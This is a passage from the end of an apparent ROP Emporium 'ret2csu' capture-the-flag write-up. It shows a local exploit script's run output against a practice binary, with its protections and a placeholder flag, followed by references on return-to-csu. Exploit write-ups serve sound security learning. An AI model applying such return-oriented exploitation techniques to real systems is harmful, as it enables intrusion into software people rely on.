</pre></table></code></div></div><p>Running the code above we get correct flag</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>vx@archie:ret2csu<span class="nv">$ </span>python3 xpl.py
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./ret2csu'</span>: pid 18869
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    RUNPATH:  b<span class="s1">'.'</span>
<span class="o">[</span>+] Receiving all data: Done <span class="o">(</span>45B<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Process <span class="s1">'./ret2csu'</span> stopped with <span class="nb">exit </span>code 0 <span class="o">(</span>pid 18869<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>  Thank you!
    ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
</pre></table></code></div></div><p>References</p><ol><li><a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf"> Universal ROP or Return-to-csu</a><li><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux program startup</a></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/thuri10.github.io/categories/ropemporium/'>ropemporium</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/thuri10.github.io/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/thuri10.github.io/tags/ropemporium/" class="post-tag no-text-decoration" >ropemporium</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Ropemporium+Ret2csu+challenge+-+LaByte&url=https%3A%2F%2Fthuri10.github.io%2Fthuri10.github.io%2Fposts%2Fropemporium-ret2csu%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Ropemporium+Ret2csu+challenge+-+LaByte&u=https%3A%2F%2Fthuri10.github.io%2Fthuri10.github.io%2Fposts%2Fropemporium-ret2csu%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fthuri10.github.io%2Fthuri10.github.io%2Fposts%2Fropemporium-ret2csu%2F&text=Ropemporium+Ret2csu+challenge+-+LaByte" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/thuri10.github.io/tags/ctf/">ctf</a> <a class="post-tag" href="/thuri10.github.io/tags/ropemporium/">ropemporium</a> <a class="post-tag" href="/thuri10.github.io/tags/malware/">malware</a> <a class="post-tag" href="/thuri10.github.io/tags/android/">android</a> <a class="post-tag" href="/thuri10.github.io/tags/appsec/">appsec</a> <a class="post-tag" href="/thuri10.github.io/tags/reverse/">reverse</a> <a class="post-tag" href="/thuri10.github.io/tags/c/">c++</a> <a class="post-tag" href="/thuri10.github.io/tags/go/">go</a> <a class="post-tag" href="/thuri10.github.io/tags/redlinestealer/">redlinestealer</a> <a class="post-tag" href="/thuri10.github.io/tags/remcosrat/">remcosrat</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/thuri10.github.io/posts/ropemporium-callme/"><div class="card-body"> <em class="small" data-ts="1640023680" data-df="ll" > Dec 20, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ropemporium callme challenge</h3><div class="text-muted small"><p> Introduction Challenge Description The goal of the challenge is understanding how more than one argument is passed in x64 function. The challenge can be downloaded from the author`s website ropem...</p></div></div></a></div><div class="card"> <a href="/thuri10.github.io/posts/ropemporium-split/"><div class="card-body"> <em class="small" data-ts="1639764420" data-df="ll" > Dec 17, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ropemporium split challenge</h3><div class="text-muted small"><p> The elements that allowed you to complete ret2win are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain The goal of this challenge is to understand...</p></div></div></a></div><div class="card"> <a href="/thuri10.github.io/posts/ropemporium-ret2win/"><div class="card-body"> <em class="small" data-ts="1640023620" data-df="ll" > Dec 20, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ropemporium Ret2win challenge</h3><div class="text-muted small"><p> Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address wi...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/thuri10.github.io/posts/ropemporium-callme/" class="btn btn-outline-primary" prompt="Older"><p>Ropemporium callme challenge</p></a> <a href="/thuri10.github.io/posts/remcosrat/" class="btn btn-outline-primary" prompt="Newer"><p>RemcosRat Excel Macro Analysis</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">thuri</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/thuri10.github.io/tags/ctf/">ctf</a> <a class="post-tag" href="/thuri10.github.io/tags/ropemporium/">ropemporium</a> <a class="post-tag" href="/thuri10.github.io/tags/malware/">malware</a> <a class="post-tag" href="/thuri10.github.io/tags/android/">android</a> <a class="post-tag" href="/thuri10.github.io/tags/appsec/">appsec</a> <a class="post-tag" href="/thuri10.github.io/tags/reverse/">reverse</a> <a class="post-tag" href="/thuri10.github.io/tags/c/">c++</a> <a class="post-tag" href="/thuri10.github.io/tags/go/">go</a> <a class="post-tag" href="/thuri10.github.io/tags/redlinestealer/">redlinestealer</a> <a class="post-tag" href="/thuri10.github.io/tags/remcosrat/">remcosrat</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/thuri10.github.io/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/thuri10.github.io/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/thuri10.github.io/app.js"></script>
